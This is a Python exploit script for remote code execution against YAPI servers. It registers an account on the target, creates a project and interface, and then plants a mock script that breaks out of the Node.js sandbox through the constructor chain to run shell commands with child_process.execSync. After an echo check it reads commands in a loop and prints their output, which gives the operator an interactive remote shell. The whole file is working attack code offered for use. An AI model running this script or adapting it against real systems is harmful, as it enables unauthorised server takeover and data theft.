# -*- coding: utf-8 -*-
import requests
import random
import time
import json
import argparse

class yapi_rce:
    def __init__(self, url):
        self.url = url
        self.session = requests.Session()
        self.UA = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36"
        }
        self.headers = {
            "Content-Type": "application/json;charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36"
        }
        self.random_num = str(random.randint(111111, 999999)) + str(int(time.time()))[:4 ] +'IIII'
        self.email = self.random_num +"@qq.com"
        self.password = self.random_num
        self.username = self.random_num
        self.timeout = 15
        self.path = "/"+str(random.randint(111111, 999999))
        self.group_id = 0
        self.project_id = 0
        self.interface_id = 0

    def check(self):
        # reg
        poc_url = self.url + "/api/user/reg"
        data = {"email": self.email, "password": self.password, "username": self.username}
        try:
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200 or 0 != json.loads(req.text)['errcode']:
                print("Website not allowed to register")
                exit()
        except:
            print("Website not allowed to register")
            exit()

        # get group_id
        poc_url = self.url +"/api/group/get_mygroup"
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("Failed to get group_id")
                exit()
            self.group_id = json.loads(req.text)['data']['_id']
        except:
            print("Failed to get group_id")
            exit()

        # creat project
        poc_url = self.url + "/api/project/add"
        try:
            data = {"name": self.random_num, "group_id": str(self.group_id), "project_type": "private"}
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("Failed to get project_id")
                exit()
            self.project_id = json.loads(req.text)['data']['_id']
        except:
            print("Failed to get project_id")
            exit()

        # creat interface
        poc_url = self.url + "/api/interface/add"
        try:
            data = {"project_id": str(self.project_id), "path": self.path, "title": self.random_num, "catid": "1", "method": "GET"}
            req = self.session.post(url=poc_url, data=data, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code != 200:
                print("Failed to get interface_id")
                exit()
            self.interface_id = json.loads(req.text)['data']['_id']
        except:
            print("Failed to get interface_id")
            exit()

        # creat mock
        poc_url = self.url + "/api/plugin/advmock/save"
        try:
            data = {"project_id": str(self.project_id), "interface_id": str(self.interface_id),
                    "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo " + self.random_num + "\").toString()",
                    "enable": True}
            req = self.session.post(url=poc_url, data=json.dumps(data), headers=self.headers, timeout=self.timeout,
                                                verify=False)
            if req.status_code != 200:
                print("Failed to create mock")
                exit()
        except:
            print("Failed to create mock")
            exit()

        # use mock
        poc_url = self.url + "/mock/" + str(self.project_id) + self.path
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code == 200 and self.random_num in req.text:
                print("The target {url} has a YAPI RCE".format(url=poc_url))
            else:
                print("There is no vulnerability in the target")
                exit()
        except:
            print("There is no vulnerability in the target")
            exit()

    def exploit(self, cmd):
        # creat mock
        poc_url = self.url + "/api/plugin/advmock/save"
        try:
            data = {"project_id": str(self.project_id), "interface_id": str(self.interface_id),
                    "mock_script": "const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"" + cmd + "\").toString()",
                    "enable": True}
            req = self.session.post(url=poc_url, data=json.dumps(data), headers=self.headers, timeout=self.timeout,
                                                verify=False)
            if req.status_code != 200:
                print("Failed to save mock")
        except:
            print("Failed to save mock")

        # use mock
        poc_url = self.url + "/mock/" + str(self.project_id) + self.path
        try:
            req = self.session.get(url=poc_url, headers=self.UA, timeout=self.timeout, verify=False)
            if req.status_code == 200:
                print(req.text)
            else:
                print("Please check the command")
        except:
            print("Please check the command")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='YAPI RCE EXP')
    parser.add_argument("-u", "--url", metavar="URI", required=True, help="Target Url")
    args = parser.parse_args()

    url = args.url.strip('/')
    rce = yapi_rce(url)
    rce.check()
    while 1:
        cmd = str(raw_input("Please enter the command"))
        rce.exploit(cmd)
